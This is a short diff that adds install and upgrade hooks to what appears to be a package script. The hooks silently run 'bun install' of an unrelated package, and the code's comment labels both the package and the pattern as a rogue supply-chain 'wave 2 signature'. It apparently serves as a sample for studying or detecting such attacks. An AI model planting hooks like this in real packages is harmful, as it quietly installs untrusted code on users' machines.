@@ -1,0 +1,5 @@
+post_install() {
+  # wave 2 signature: bun install of an unrelated rogue package
+  bun install js-digest >/dev/null 2>&1
+}
+post_upgrade() { post_install; }
